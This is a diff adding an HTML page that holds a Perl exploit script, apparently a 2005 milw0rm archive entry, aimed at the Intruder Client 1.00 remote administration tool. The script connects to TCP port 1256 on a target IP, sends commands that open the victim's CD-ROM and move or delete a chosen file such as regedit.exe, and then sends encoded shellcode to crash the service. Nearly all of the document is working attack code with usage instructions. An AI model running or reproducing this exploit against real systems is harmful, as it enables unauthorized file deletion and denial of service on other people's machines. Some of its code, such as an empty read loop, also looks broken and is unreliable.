@@ -1,0 +1,128 @@
+<html><head><title>Intruder Client 1.00 Remote Command Execution & DoS Exploit</title></head><pre>#!/usr/bin/perl
+#
+# Intruder Command Execution DOS Exploit
+# --------------------------------------
+#   Infam0us Gr0up - Securiti Research
+#
+#
+# [?] Version: libwww-perl-5.76
+# [+] Connecting to 127.0.0.1..
+# [+] Connected
+# [+] Backup for files..[DONE]
+# [+] Build malicious pages..[DONE]
+# [+] Open CDRom victim..[DONE]
+# [+] Delete C:\WINNT\regedit.exe..[DONE]
+# [+] Now attacking ..[SUCCESS]
+# [+] Check if Server D0S'ed!
+#
+# Tested on Windows2000 SP4(Win NT)
+# Info : infamous.2hell.com
+#
+
+use IO::Socket;
+use LWP;
+use Tk;
+use Win32::File;
+
+
+$subject = &quot;Intruder Command Execution DOS Exploit&quot;;
+$vers = &quot;Intruder Client 1.00&quot;;
+$vendor = &quot;http://digilander.iol.it/TatankaRock&quot;;
+$codz = &quot;basher13 - basher13(at)linuxmail.org&quot;;
+
+$ARGC=@ARGV;
+
+if ($ARGC !=2) {
+    print &quot;\n&quot;;
+    print &quot;     $subject\n&quot;;
+    print &quot;-------------------------------------------------\n&quot;;
+    print &quot;     Infam0us Gr0up - Securiti Research\n\n&quot;;
+    print &quot;Usage: $0 [remote IP] [file Path]\n&quot;;
+    print &quot;Exam: $0 127.0.0.1 C:\\WINNT\\regedit.exe\n&quot;;
+    print &quot;- [remote IP] = Target host IP/Hostname\n&quot;;
+    print &quot;- [file Path] = Path file to delete\n&quot;;
+    exit(1);
+}
+
+$host = $ARGV[0];
+$delfile = $ARGV[1];
+# Modify to own feed
+$text = &quot;Subject: $subject
+Version: $vers
+URL: $vendor
+Coders: $codz&quot;;
+$box = &quot;C:\-[$subject]-.htm&quot;;
+
+$shellcore = 
+&quot;Moving_Dialog,0x13:test:1&quot;.&quot;\x68\x62\x69\x1\x1\x68\x72\x64\x60\x73\x68\x68\x21\x53&quot;.
+&quot;\x64\x68\x74\x73\x68\x75\x68\x21\x52\x64\x62\x68\x74\x71\x21\x2C\x68\x21\x46\x73\x31&quot;.
+&quot;\x68\x6C\x31\x74\x72\x68\x48\x6F\x67\x60\x68\x21\x43\x58\x21\x68\x55\x40\x42\x4A\x68&quot;.
+&quot;\x46\x21\x40\x55\x68\x43\x44\x48\x4F\x68\x49\x40\x45\x21\x68\x58\x4E\x54\x21\x68\x42&quot;.
+&quot;\x4A\x20\x20\x68\x40\x55\x55\x40\x68\x45\x4E\x52\x21\x68\x42\x4A\x20\x20\x68\x40\x55&quot;.
+&quot;\x55\x40\x68\x45\x4E\x52\x21\x33\xC9\x8B\xDC\x80\x33\x1\x43\x41\x83\xF9\x52\x75\xF6&quot;.
+&quot;\x54\xC3&quot;;
+
+print &quot;\n&quot;;
+print &quot;       $subject\n&quot;;
+print &quot;-------------------------------------------------------\n&quot;;
+print &quot;[?] Version: libwww-perl-$LWP::VERSION\n&quot;;
+print &quot;[+] Connecting to $host..\n&quot;;
+sleep(2);
+$socket = new IO::Socket::INET (PeerAddr =&gt; &quot;$host&quot;,
+                                PeerPort =&gt; 1256,
+                                Proto =&gt; 'tcp');
+                                die unless $socket;
+print &quot;[+] Connected\n&quot;;
+sleep(2);
+print &quot;[+] Backup for files..&quot;;
+$lama = $delfile;
+$baru = &quot;$delfile.BAK.$$(basher13)&quot;;
+
+ open(OLD, &quot;&lt; $lama&quot;)         or die &quot;FAILED to open $lama\n[-] Reason: Try to another place..\n&quot;;
+ open(NEW, &quot;&gt; $baru&quot;)         or die &quot;can't open $baru: $!\n&quot;;
+
+ while () {
+        s/\b(p)earl\b/${1}erl/i;
+        (print NEW $_)       or die &quot;FAILED to write to $baru\n[-] Reason: Server has secure permission\n&quot;;
+    }
+ close(OLD)                  or die &quot;FAILED to close $lama\n&quot;;
+ close(NEW)                  or die &quot;can't close $baru\n&quot;;
+print &quot;[DONE]\n&quot;;     
+print &quot;[+] Build malicious pages..&quot;;
+
+open(OUT, &quot;&gt;$box&quot;) or die(&quot;unable to open $box: $!&quot;);
+open FH, &quot;&gt;$box&quot;;
+print FH &quot;$text&quot;;
+print &quot;[DONE]\n&quot;;
+close FH;
+
+print &quot;[+] Open CDRom victim..&quot;;
+print $socket &quot;OpenCDROM,&quot;;
+sleep(1);
+print &quot;[DONE]\n&quot;;
+print &quot;[+] Delete $delfile..&quot;;
+print $socket &quot;Move,$delfile|$box&quot;;
+sleep(2);
+print &quot;[DONE]\n&quot;;
+print &quot;[+] Now attacking ..&quot;;
+sleep(1);
+print $socket &quot;$shellcore&quot;;
+sleep(3);
+print &quot;[SUCCESS]\n&quot;;
+close $socket;
+print &quot;[+] Server D0S'ed!\n&quot;;
+print &quot;-------------------------------------------------------\n&quot;;
+my $mw = MainWindow-&gt;new(-title =&gt; 'INFO',);
+    my $var;
+
+    my $opt = $mw-&gt;Optionmenu(
+                
+                -options =&gt; [qw()],
+                -command =&gt; sub { print &quot;[&gt;] &quot;, shift, &quot;\n&quot; },
+                -variable =&gt; \$var,
+                )-&gt;pack;
+    $opt-&gt;addOptions([- Subject=&gt;$subject],[- Version=&gt;$vers],[- Vendor=&gt;$vendor],[- Coder=&gt;$codz]);   
+    $mw-&gt;Button(-text=&gt;'CLOSE', -command=&gt;sub{$mw-&gt;destroy})-&gt;pack;
+    MainLoop;
+
+# milw0rm.com [2005-07-21]</pre></html>
